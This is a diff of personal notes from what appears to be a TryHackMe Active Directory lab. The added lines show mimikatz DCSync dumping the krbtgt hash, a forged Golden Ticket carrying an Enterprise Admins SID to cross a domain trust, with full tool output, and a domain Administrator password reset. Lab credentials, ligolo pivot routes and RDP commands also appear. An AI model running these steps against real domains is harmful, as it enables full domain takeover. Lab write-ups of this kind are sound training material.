@@ -1073,7 +1073,7 @@ The command completed successfully.
 		10.0.17763 N/A Build 17763 
 
 //CREDS:
-
+		qw1.brian.singh : _4v41yVd$!DW
 //Flags:
 #User:		THM{1dac8c6b-908e-4100-9deb-f53e68df840d}
 #System:	THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}
@@ -1090,6 +1090,86 @@ cat C:\Users\Administrator\root.txt
 
 // Golden Ticket – AI.VANCHAT.LOC
 # After compromising the child domain, I want to try and forge a Golden Ticket to escalate privileges across the trust boundary. 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#Run mimikatz as administrator
+
+#Dumping the krbtgt hash via DCSync
+privilege::debug
+lsadump::dcsync /domain:ai.vanchat.loc /user:ai\krbtgt
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 10/29/2025 8:18:41 AM
+Object Security ID   : S-1-5-21-2486023134-1966250817-35160293-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: d816e3b716ded6bc8cfc1feb5d165887
+
+
+#Retrieve the domain SID:
+Get-ADDomain -Identity vanchat.loc | Select-Object -ExpandProperty DomainSID
+        SID_Parent: S-1-5-21-2737471197-2753561878-509622479
+
+
+#With all required information, lets forge and inject a Golden Ticket:
+
+mimikatz # kerberos::golden /user:Administrator /domain:ai.vanchat.loc /sid:S-1-5-21-2486023134-1966250817-35160293 /aes256:cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee /id:500 /groups:512 /sids:S-1-5-21-2737471197-2753561878-509622479-519 /ptt
+
+User      : Administrator
+Domain    : ai.vanchat.loc (AI)
+SID       : S-1-5-21-2486023134-1966250817-35160293
+User Id   : 500
+Groups Id : *512
+Extra SIDs: S-1-5-21-2737471197-2753561878-509622479-519 ;
+ServiceKey: cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee - aes256_hmac
+Lifetime  : 4/4/2026 7:53:06 AM ; 4/1/2036 7:53:06 AM ; 4/1/2036 7:53:06 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ ai.vanchat.loc' successfully submitted for current session 
+
+//We have a GoldenTicket(full Domain Access) for the Administrator user, lets change the password for the account to make easier RDP sessions. 
+
+net user Administrator abc123!!! /domain
+
+//Close RDP session for DC1
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+|================================================================
+- Name: rdc1
+- IP Address: 10.200.171.121
+- OS: 
+
+//CREDS:
+	Administrator : abc123!!!
+
+//Flags:
+#User:
+#System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -1122,7 +1202,6 @@ You should now see:
 Listening on 0.0.0.0:11601
 
 //2. Transfer Agent to Target
-cd ~/haxterm/data/SideQuest0/1-db
 
 which ligolo-agent
 /usr/bin/ligolo-agent
@@ -1143,16 +1222,24 @@ start
 
 //Add Routes
 sudo ip route add 10.200.171.101/32 dev ligolo
-sudo ip route add 10.200.171.122/32 dev ligolo
 sudo ip route add 10.200.171.102/32 dev ligolo
+sudo ip route add 10.200.171.122/32 dev ligolo
+sudo ip route add 10.200.171.121/32 dev ligolo
 
-//Domain Admin
+
+//Domain Admin to Server2
 xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /u:adm /p:'8XX8N5VBFprFfmFSdQ4soUM4' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
-//RDP from Server2(10.200.171.102)
+//RDP from Server2(10.200.171.102) to DC1(10.200.171.122)
+Use the DC-Connect shortcut for AI.VANCHAT.LOC
 
+
+//RDP from Server2(10.200.171.102) to RDC1(10.200.171.121)
+Use the DC2-Connect shortcut for VANCHAT.LOC
+
+
+vanchat\Administrator
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
